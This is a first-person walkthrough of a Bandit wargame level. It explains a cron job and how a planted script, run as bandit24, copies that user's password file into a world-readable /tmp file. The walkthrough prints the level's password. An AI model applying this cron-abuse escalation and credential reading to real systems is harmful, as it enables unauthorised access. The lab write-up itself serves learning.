# Bandit Level 23 → Level 24

## 🎯 Objective

A program is running automatically at regular intervals using **cron**, the time-based job scheduler.

The challenge instructed me to look inside:

```text
/etc/cron.d/
```

and find the configuration that determines which command is being executed.

This level also requires creating my **first shell script**.

The important idea is that the cron job runs as **bandit24**, while I am logged in as **bandit23**. By creating a shell script that gets executed by the cron job, I can make `bandit24` perform an action that `bandit23` normally cannot perform.

## 🔎 Finding the Cron Job

I first examined the cron configuration:

```bash
cat cronjob_bandit24
```

It contained:

```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

The important entry was:

```text
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

### 🔍 Understanding the Cron Entry

The five fields:

```text
* * * * *
```

represent:

```text
minute hour day-of-month month day-of-week
```

Since all five fields contain `*`, the command runs:

```text
Every minute
```

The next field:

```text
bandit24
```

specifies the user under which the command runs.

Therefore:

```text
/usr/bin/cronjob_bandit24.sh
```

is executed every minute as the **bandit24** user.

The following:

```text
&> /dev/null
```

redirects both standard output and standard error to `/dev/null`.

Therefore, the cron job runs silently.

## 📄 Examining the Cron Script

I first accidentally tried:

```bash
cat usr/bin/cronjob_bandit24.sh
```

This failed because the path was missing the `/` at the beginning:

```text
cat: usr/bin/cronjob_bandit24.sh: No such file or directory
```

The correct command was:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

The script contained:

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

## 🧠 Understanding the Script

There are several important parts of this script.

### `#!/bin/bash`

```bash
#!/bin/bash
```

This is called a **shebang**.

It tells Linux to execute the script using the Bash interpreter located at:

```text
/bin/bash
```

### `shopt -s nullglob`

```bash
shopt -s nullglob
```

This enables the Bash `nullglob` option.

It makes patterns that do not match any files expand to nothing instead of remaining as literal patterns.

### Finding the Current User

```bash
myname=$(whoami)
```

`whoami` prints the username of the user executing the script.

Since the cron job runs as:

```text
bandit24
```

the value of:

```text
$myname
```

will be:

```text
bandit24
```

Therefore:

```text
/var/spool/"$myname"/foo
```

becomes:

```text
/var/spool/bandit24/foo
```

### Changing Directory

The script then executes:

```bash
cd /var/spool/"$myname"/foo || exit
```

Because the script runs as `bandit24`, it changes into:

```text
/var/spool/bandit24/foo
```

This is the directory where the cron job looks for scripts.

I tried accessing this directory myself:

```bash
ls /var/spool/bandit24/foo
```

but received:

```text
ls: cannot open directory '/var/spool/bandit24/foo': Permission denied
```

This is expected because I am logged in as `bandit23`, not `bandit24`.

## 🔍 Understanding the Loop

The script contains:

```bash
for i in * .*;
do
```

This loops through the files in the directory, including hidden files.

The script then checks:

```bash
if [ "$i" != "." ] && [ "$i" != ".." ];
```

This prevents it from processing the special directory entries:

```text
.
..
```

For each remaining file, it determines the owner:

```bash
owner="$(stat --format "%U" "./$i")"
```

The `stat` command provides information about a file.

The option:

```text
--format "%U"
```

prints the username of the file owner.

The next condition is extremely important:

```bash
if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
```

The script executes the file only when:

1. The file is owned by `bandit23`.
2. The file is a regular file.

Therefore, I need to place a script in:

```text
/var/spool/bandit24/foo
```

and make sure that the script is owned by:

```text
bandit23
```

Since I create the file as `bandit23`, this condition will be satisfied.

## ⚙️ Executing the Script

The cron job executes the script using:

```bash
timeout -s 9 60 "./$i"
```

This executes my script with a maximum runtime of:

```text
60 seconds
```

The `-s 9` option specifies signal 9, which is `SIGKILL`.

After the script is executed, the cron job removes it:

```bash
rm -rf "./$i"
```

This explains the warning in the challenge:

> Keep in mind that your shell script is removed once executed.

Because of this, it is a good idea to keep a copy of the original script somewhere else.

## 📝 Creating My Shell Script

I created a temporary workspace:

```bash
mkdir /tmp/my_workspace
```

I then gave the directory full permissions:

```bash
chmod 777 /tmp/my_workspace
```

and entered it:

```bash
cd /tmp/my_workspace
```

I created my shell script using:

```bash
echo '#!/bin/bash' > getpass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/my_workspace/password.txt' >> getpass.sh
```

The resulting script was:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_workspace/password.txt
```

### 🔍 Understanding My Script

The first line:

```bash
#!/bin/bash
```

tells the system to execute the file using Bash.

The second line:

```bash
cat /etc/bandit_pass/bandit24 > /tmp/my_workspace/password.txt
```

reads:

```text
/etc/bandit_pass/bandit24
```

and redirects its contents into:

```text
/tmp/my_workspace/password.txt
```

The important part is that the script will be executed by the cron job as:

```text
bandit24
```

Therefore, the `cat` command runs with the permissions of `bandit24`.

## 🔐 Making the Script Executable

I then made the script executable:

```bash
chmod 777 getpass.sh
```

This gives the owner, group, and others read, write, and execute permissions.

## 📂 Placing the Script in the Cron Directory

I first tried:

```bash
cp getpass.sh /var/spool/bandit24/
```

but this failed:

```text
cp: cannot create regular file '/var/spool/bandit24/getpass.sh': Operation not permitted
```

This happened because the cron script does not look directly inside:

```text
/var/spool/bandit24/
```

It specifically looks inside:

```text
/var/spool/bandit24/foo
```

I therefore copied the script into the correct directory:

```bash
cp getpass.sh /var/spool/bandit24/foo/
```

This command succeeded.

## ⏳ Waiting for Cron

The cron job runs every minute:

```text
* * * * *
```

The cron script checks:

```text
/var/spool/bandit24/foo
```

It finds my script:

```text
getpass.sh
```

The file is owned by:

```text
bandit23
```

so it satisfies the condition:

```bash
[ "${owner}" = "bandit23" ] && [ -f "$i" ]
```

Cron then executes:

```text
getpass.sh
```

as:

```text
bandit24
```

My script reads:

```text
/etc/bandit_pass/bandit24
```

and writes the result to:

```text
/tmp/my_workspace/password.txt
```

After execution, the cron job deletes:

```text
getpass.sh
```

from the spool directory.

This is why keeping the original copy in:

```text
/tmp/my_workspace/
```

was useful.

## 🔑 Retrieving the Password

Initially, I checked the output file:

```bash
cat /tmp/my_workspace/password.txt
```

but received:

```text
cat: /tmp/my_workspace/password.txt: No such file or directory
```

This was because the cron job had not executed my script yet.

After waiting for the cron job to run, I checked the directory again:

```bash
ls
```

This time it showed:

```text
getpass.sh
password.txt
```

I then read the password:

```bash
cat password.txt
```

This returned:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

## 🔑 Password

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

## 🧠 What I Learned

* **Cron** is used to automatically execute commands at scheduled intervals.
* `/etc/cron.d/` contains cron configuration files.
* `* * * * *` means a command runs every minute.
* The username in a cron entry specifies which user executes the command.
* A cron job running as another user can have permissions that my current user does not have.
* `whoami` displays the current username.
* `$(command)` is **command substitution** in Bash.
* `stat --format "%U"` can be used to find the owner of a file.
* `-f` checks whether a path refers to a regular file.
* `timeout` can limit how long a command is allowed to run.
* `>` redirects command output into a file.
* A cron job can execute scripts placed in a specific directory.
* The cron script checks that submitted scripts are owned by `bandit23`.
* The cron job removes each processed script after execution.
* Keeping a backup copy of a shell script is useful when the original is automatically deleted.
* Shell scripting allows multiple Linux commands to be automated together.

---

## 📌 Key Takeaway

The main idea of this level was to understand the complete execution chain:

```text
/etc/cron.d/cronjob_bandit24
        ↓
Runs every minute as bandit24
        ↓
/usr/bin/cronjob_bandit24.sh
        ↓
Looks inside /var/spool/bandit24/foo
        ↓
Finds scripts owned by bandit23
        ↓
Executes the script as bandit24
        ↓
My script reads /etc/bandit_pass/bandit24
        ↓
Password is written to /tmp/my_workspace/password.txt
        ↓
Cron deletes the submitted script
        ↓
I read password.txt
```

The important commands I used were:

```bash
cat /etc/cron.d/cronjob_bandit24
```

```bash
cat /usr/bin/cronjob_bandit24.sh
```

```bash
mkdir /tmp/my_workspace
```

```bash
chmod 777 /tmp/my_workspace
```

```bash
cd /tmp/my_workspace
```

```bash
echo '#!/bin/bash' > getpass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/my_workspace/password.txt' >> getpass.sh
```

```bash
chmod 777 getpass.sh
```

```bash
cp getpass.sh /var/spool/bandit24/foo/
```

After waiting for cron to execute the script:

```bash
cat /tmp/my_workspace/password.txt
```

which gave me the password for **Level 24**:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```